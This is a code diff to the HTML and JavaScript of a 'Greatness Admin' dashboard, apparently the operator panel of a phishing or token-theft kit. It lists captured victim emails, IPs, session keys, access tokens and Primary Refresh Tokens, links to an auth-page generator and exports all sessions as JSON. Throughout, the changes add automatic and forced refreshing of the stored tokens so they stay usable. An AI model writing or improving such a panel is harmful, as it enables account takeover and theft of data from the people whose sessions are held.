@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Greatness Admin - Token Manager</title>
+    <title>Greatness Admin - Auto-Refresh Token Manager</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
@@ -23,9 +23,10 @@
         th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
         th { color: #8b8fbf; font-size: 12px; }
         td { font-size: 12px; }
-        .btn-view { background: #10b981; border: none; padding: 4px 10px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
+        .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
         .btn-prt { background: #f59e0b; }
         .btn-session { background: #8b5cf6; }
+        .btn-refresh { background: #3b82f6; }
         .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 750px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
         .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; white-space: pre-wrap; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
@@ -33,27 +34,31 @@
         .loading { text-align: center; padding: 40px; color: #6b7280; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .has-prt { color: #10b981; font-size: 10px; }
-        .session-key { font-family: monospace; font-size: 10px; background: #1f2937; padding: 2px 4px; border-radius: 4px; }
+        .auto-refresh-badge { background: #10b981; color: white; padding: 2px 8px; border-radius: 12px; font-size: 10px; margin-left: 10px; }
+        .token-preview { font-family: monospace; font-size: 10px; color: #8b8fbf; margin-top: 4px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo"><h1>Greatness Admin</h1><p>PRT & Session Manager</p></div>
+        <div class="logo">
+            <h1>Greatness Admin</h1>
+            <p>Auto-Refresh Token Manager</p>
+        </div>
         <div class="badge" id="sessionCount">0 Sessions</div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
         <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
-        <div class="stat-card"><div class="stat-title">Active Tokens</div><div class="stat-value" id="activeTokens">0</div></div>
-        <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
+        <div class="stat-card"><div class="stat-title">Auto-Refresh</div><div class="stat-value" id="autoRefreshStatus">Active</div></div>
+        <div class="stat-card"><div class="stat-title">Last Refresh</div><div class="stat-value" id="lastRefresh" style="font-size: 12px;">-</div></div>
     </div>
 
     <div class="tools-section">
         <div class="tools-grid">
-            <button class="tool-btn" id="refreshBtn">🔄 Refresh</button>
+            <button class="tool-btn" id="refreshBtn">🔄 Refresh Dashboard</button>
+            <button class="tool-btn" id="forceRefreshBtn">⚡ Force Refresh All Tokens</button>
             <button class="tool-btn" id="clearBtn">🗑️ Clear All</button>
             <button class="tool-btn" id="exportBtn">📄 Export</button>
             <button class="tool-btn" id="addAccountBtn">➕ Add Account</button>
@@ -61,12 +66,12 @@
     </div>
 
     <div class="table-container">
-        <h3>📋 Captured Sessions - PRT & Session Keys</h3>
+        <h3>📋 Active Sessions - Tokens Auto-Refresh Every 5 Seconds</h3>
         <table>
             <thead>
-                <tr><th>Email</th><th>IP</th><th>Session Key</th><th>PRT Status</th><th>Captured</th><th>Actions</th></tr>
+                <tr><th>Email</th><th>IP</th><th>Session Key</th><th>PRT</th><th>Last Refreshed</th><th>Actions</th></tr>
             </thead>
-            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...</td></tr></tbody>
+            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading... </td></tr></tbody>
         </table>
     </div>
 </div>
@@ -79,6 +84,8 @@
 </div>
 
 <script>
+    let autoRefreshInterval;
+    
     async function apiCall(endpoint, options = {}) {
         try {
             const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
@@ -93,6 +100,7 @@
             renderTable(data.sessions);
             updateStats(data.sessions);
             document.getElementById('sessionCount').innerHTML = `${data.sessions.length} Sessions`;
+            document.getElementById('lastRefresh').innerHTML = new Date().toLocaleTimeString();
         }
     }
 
@@ -107,53 +115,111 @@
             <tr>
                 <td style="color:#60a5fa; font-weight:500;">${escapeHtml(s.email)}</td>
                 <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
-                <td><code class="session-key" title="${escapeHtml(s.sessionKey)}">${escapeHtml(s.sessionKey?.substring(0, 16) || 'N/A')}...</code></td>
-                <td>${s.hasRefreshToken ? '<span class="has-prt">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
-                <td>${formatDate(s.capturedAt)}<br><small>Exp: ${s.tokenExpires || 'N/A'}</small></td>
+                <td><code class="session-key" style="font-size:10px;">${escapeHtml(s.sessionKey?.substring(0, 20) || 'N/A')}...</code></td>
+                <td>${s.hasRefreshToken ? '<span style="color:#10b981;">✅ PRT Active</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
+                <td><small>${formatDate(s.lastRefreshed)}</small><br><small>Exp: ${s.tokenExpires}</small></td>
                 <td>
-                    <button class="btn-view" onclick="viewTokens('${s.sid}', 'access')">🔑 Access Token</button>
-                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewTokens('${s.sid}', 'prt')">🔄 PRT</button>` : ''}
-                    <button class="btn-view btn-session" onclick="viewTokens('${s.sid}', 'session')">🔐 Session Key</button>
+                    <button class="btn-view" onclick="viewToken('${s.sid}', 'access')">🔑 Access Token</button>
+                    ${s.hasRefreshToken ? `<button class="btn-view btn-prt" onclick="viewToken('${s.sid}', 'prt')">🔄 PRT</button>` : ''}
+                    <button class="btn-view btn-session" onclick="viewToken('${s.sid}', 'session')">🔐 Session Key</button>
+                    <button class="btn-view btn-refresh" onclick="refreshSingleToken('${s.sid}')">⚡ Refresh</button>
                 </td>
             </tr>
         `).join('');
     }
 
-    async function viewTokens(sid, type) {
+    async function viewToken(sid, type) {
         document.getElementById('tokenModal').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading...</div>';
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Getting FRESH token...</div>';
         
+        // This automatically refreshes the token before returning it
         const data = await apiCall(`/api/session/tokens/${sid}`);
+        
         if (data) {
-            let title = '';
-            let content = '';
+            let title = '', content = '';
+            const refreshTime = new Date(data.lastRefreshed).toLocaleTimeString();
             
             if (type === 'access') {
-                title = '🔐 Access Token';
-                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                          <p><strong>Token Type:</strong> ${data.token_type || 'Bearer'}</p>
-                          <p><strong>Expires:</strong> ${new Date(data.expires_at).toLocaleString()}</p>
-                          <p><strong>Access Token:</strong></p>
-                          <pre>${escapeHtml(data.access_token)}</pre>`;
+                title = '🔐 FRESH Access Token';
+                content = `
+                    <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                    <p><strong>Token Refreshed At:</strong> ${refreshTime}</p>
+                    <p><strong>Token Type:</strong> ${data.token_type || 'Bearer'}</p>
+                    <p><strong>Expires In:</strong> ${data.expires_in} seconds</p>
+                    <p><strong>Fresh Access Token:</strong></p>
+                    <pre>${escapeHtml(data.access_token)}</pre>
+                    <p style="font-size: 11px; color: #10b981;">✅ This is a NEW token, valid for the next hour</p>
+                `;
             } else if (type === 'prt') {
                 title = '🔄 Primary Refresh Token (PRT)';
-                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                          <p><strong>PRT (Refresh Token):</strong></p>
-                          <pre>${escapeHtml(data.refresh_token)}</pre>
-                          <p style="font-size: 11px; color: #f59e0b;">⚠️ This token can be used to generate new access tokens indefinitely.</p>`;
+                content = `
+                    <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                    <p><strong>PRT (Refresh Token):</strong></p>
+                    <pre>${escapeHtml(data.refresh_token)}</pre>
+                    <p style="font-size: 11px; color: #f59e0b;">⚠️ This token can generate new access tokens indefinitely</p>
+                `;
             } else if (type === 'session') {
                 title = '🔐 Session Key';
-                content = `<p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                          <p><strong>Session Key:</strong></p>
-                          <pre>${escapeHtml(data.sessionKey)}</pre>
-                          <p style="font-size: 11px; color: #8b5cf6;">🔑 This key uniquely identifies this session.</p>`;
+                content = `
+                    <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                    <p><strong>Session Key:</strong></p>
+                    <pre>${escapeHtml(data.sessionKey)}</pre>
+                    <p style="font-size: 11px; color: #8b5cf6;">🔑 Unique identifier for this session</p>
+                `;
             }
             
             document.getElementById('modalTitle').innerHTML = title;
             document.getElementById('tokenDetails').innerHTML = content;
         } else {
-            document.getElementById('tokenDetails').innerHTML = '<p style="color:#ef4444;">❌ Failed to load tokens.</p>';
+            document.getElementById('tokenDetails').innerHTML = '<p style="color:#ef4444;">❌ Failed to get fresh token</p>';
+        }
+    }
+
+    async function refreshSingleToken(sid) {
+        const btn = event.target;
+        const originalText = btn.textContent;
+        btn.textContent = '🔄 Refreshing...';
+        btn.disabled = true;
+        
+        const data = await apiCall(`/api/session/token/${sid}`);
+        
+        if (data) {
+            btn.textContent = '✅ Refreshed!';
+            setTimeout(() => {
+                btn.textContent = originalText;
+                btn.disabled = false;
+            }, 2000);
+            loadSessions(); // Refresh the table to show new timestamp
+        } else {
+            btn.textContent = '❌ Failed';
+            setTimeout(() => {
+                btn.textContent = originalText;
+                btn.disabled = false;
+            }, 2000);
+        }
+    }
+
+    async function forceRefreshAll() {
+        const btn = document.getElementById('forceRefreshBtn');
+        btn.textContent = '🔄 Refreshing All...';
+        btn.disabled = true;
+        
+        const result = await apiCall('/api/refresh-all', { method: 'POST' });
+        
+        if (result && result.success) {
+            btn.textContent = `✅ Refreshed ${result.count} sessions`;
+            setTimeout(() => {
+                btn.textContent = '⚡ Force Refresh All Tokens';
+                btn.disabled = false;
+            }, 2000);
+            loadSessions();
+        } else {
+            btn.textContent = '❌ Failed';
+            setTimeout(() => {
+                btn.textContent = '⚡ Force Refresh All Tokens';
+                btn.disabled = false;
+            }, 2000);
         }
     }
 
@@ -161,8 +227,6 @@
         document.getElementById('totalSessions').innerText = sessions.length;
         const withPRT = sessions.filter(s => s.hasRefreshToken).length;
         document.getElementById('withPRT').innerText = withPRT;
-        document.getElementById('activeTokens').innerText = sessions.length;
-        if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
     }
 
     function closeModal() {
@@ -170,19 +234,41 @@
         document.getElementById('overlay').style.display = 'none';
     }
 
-    function openAddAccount() { window.open('/generate-auth-page', '_blank', 'width=600,height=700'); setTimeout(loadSessions, 3000); }
-    async function clearAll() { if(confirm('Clear all sessions?')){ await apiCall('/api/sessions/clear',{method:'DELETE'}); loadSessions(); } }
-    async function exportData() { const data = await apiCall('/api/sessions'); if(data && data.sessions){ const blob = new Blob([JSON.stringify(data.sessions,null,2)],{type:'application/json'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`sessions_${Date.now()}.json`; a.click(); } }
+    function openAddAccount() { 
+        window.open('/generate-auth-page', '_blank', 'width=600,height=700');
+        setTimeout(loadSessions, 3000);
+    }
+    
+    async function clearAll() { 
+        if(confirm('Clear all sessions?')){ 
+            await apiCall('/api/sessions/clear',{method:'DELETE'}); 
+            loadSessions(); 
+        } 
+    }
+    
+    async function exportData() { 
+        const data = await apiCall('/api/sessions'); 
+        if(data && data.sessions){ 
+            const blob = new Blob([JSON.stringify(data.sessions,null,2)],{type:'application/json'}); 
+            const a=document.createElement('a'); 
+            a.href=URL.createObjectURL(blob); 
+            a.download=`sessions_${Date.now()}.json`; 
+            a.click(); 
+        } 
+    }
+    
     function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
     function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
 
     document.getElementById('refreshBtn').onclick = loadSessions;
+    document.getElementById('forceRefreshBtn').onclick = forceRefreshAll;
     document.getElementById('clearBtn').onclick = clearAll;
     document.getElementById('exportBtn').onclick = exportData;
     document.getElementById('addAccountBtn').onclick = openAddAccount;
     
+    // Auto-refresh dashboard every 3 seconds
+    setInterval(loadSessions, 3000);
     loadSessions();
-    setInterval(loadSessions, 10000);
 </script>
 </body>
 </html>
